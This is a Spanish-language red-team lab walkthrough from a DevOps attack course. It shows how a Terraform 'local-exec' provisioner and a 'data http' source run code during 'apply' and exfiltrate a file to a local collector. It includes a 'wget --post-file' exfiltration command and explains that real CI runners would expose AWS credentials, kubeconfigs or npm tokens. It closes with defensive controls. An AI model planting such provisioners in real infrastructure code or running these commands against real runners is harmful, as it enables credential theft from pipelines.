# 13 - RCE en `terraform apply` y exfiltracion HTTP

**Clase 4 · 25 min · M5 Terraform**
**Fase:** ejecucion en IaC / impacto
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1041 (Exfiltration Over C2 Channel)
**Riesgo OWASP CI/CD:** CICD-SEC-4 (pipeline envenenado), CICD-SEC-5 (control de acceso del pipeline)

## Escenario

El plan del lab 12 ya ejecutaba codigo. En `apply` hay una segunda
oportunidad: `local-exec` corre en la maquina que aplica, con sus credenciales y
su red. Ademas, un `data "http"` puede enviar datos **despues** de crear un
recurso, lo que permite confirmar el despliegue y exfiltrar el resultado en una
sola operacion.

## Objetivo de aprendizaje

- Ejecutar comandos con `local-exec` durante el apply.
- Ver que un `data` source puede leer un recurso recien creado y enviarlo.
- Distinguir plan y apply en el momento de la ejecucion.

## Antes de empezar

```bash
cd /home/ponciop/devops-redteam/lab/terraform/apply-rce
curl -s http://localhost:8888/__clear
cat main.tf
```

**Que esperar:** un `null_resource` con `local-exec` y un `data "http"` que
referencia su `id`.

## Paso 1 - Inicializar

```bash
../../../tools/tf init -input=false
```

**Que esperar:** `Terraform has been successfully initialized!` (providers
`null` y `http`).

## Paso 2 - Aplicar

```bash
../../../tools/tf apply -auto-approve -input=false
```

**Que esperar:**

```
null_resource.deploy: Creating...
null_resource.deploy: Provisioning with 'local-exec'...
data.http.leak: Reading...
Apply complete! Resources: 1 added, 0 changed, 0 destroyed.
```

El `data.http.leak` se lee despues del recurso porque su `request_body`
interpola `${null_resource.deploy.id}`. Terraform no puede calcularlo antes.

## Paso 3 - Ver la exfiltracion

```bash
curl -s http://localhost:8888/__requests \
  | python3 -c 'import sys,json;[print(x["path"],"|",x["body"][:120]) for x in json.load(sys.stdin)]'
```

**Que esperar:**

```
/tf/apply-rce  | FLAG{terraform_apply_rce}
/tf/http-exfil | apply completado: <id numerico>
```

`/tf/apply-rce` lo envia `local-exec` con el contenido de
`/hosthome/.devops-lab-tf-apply-flag`. `/tf/http-exfil` lo envia el provider
`http` como si fuera una llamada de telemetria.

## Paso 4 - Repetir el efecto

Terraform es idempotente: si no hay cambios, `local-exec` no se ejecuta.

```bash
../../../tools/tf apply -auto-approve -input=false
```

**Que esperar:** `No changes.` y **ninguna** peticion nueva en hookcat.

Para forzar la ejecucion:

```bash
curl -s http://localhost:8888/__clear
../../../tools/tf apply -replace=null_resource.deploy -auto-approve -input=false
```

**Que esperar:** otra vez las dos peticiones. Este detalle es util en un
engagement: si el pipeline solo aplica cambios, el backdoor se ejecuta una vez.

## Paso 5 - Leer lo que el atacante se lleva

El comando real es:

```bash
wget -qO- --post-file=/hosthome/.devops-lab-tf-apply-flag \
  http://localhost:8888/tf/apply-rce
```

`/hosthome` es el home del host montado por `tools/tf`. En un runner real seria
`/home/ci/.aws/credentials`, un `kubeconfig`, un `.npmrc` o cualquier token
presente en el entorno.

## Evidencia para el informe

- `main.tf` con `local-exec` y `data "http"` resaltados.
- Salida del apply y peticiones en hookcat.
- Diferencia entre el primer apply y el segundo (`No changes`).
- Que credenciales habria en un runner real.

## Checkpoint

1. Por que el `data "http"` se lee en apply y no en plan?
2. Que diferencia hay entre `local-exec` y `remote-exec`?
3. Que control impide que un `local-exec` hable con internet?

## Defensa

- Revisar `provisioner`, `local-exec` y `data` nuevos en cada PR.
- Conftest/OPA: prohibir `local-exec`, `remote-exec` y `data.external` sin
  excepcion documentada.
- Credenciales de apply de corta duracion y scope minimo (OIDC, no claves fijas).
- Runner sin acceso al home de nadie y egress restringido.
- Aprobacion manual para cambios de infraestructura.
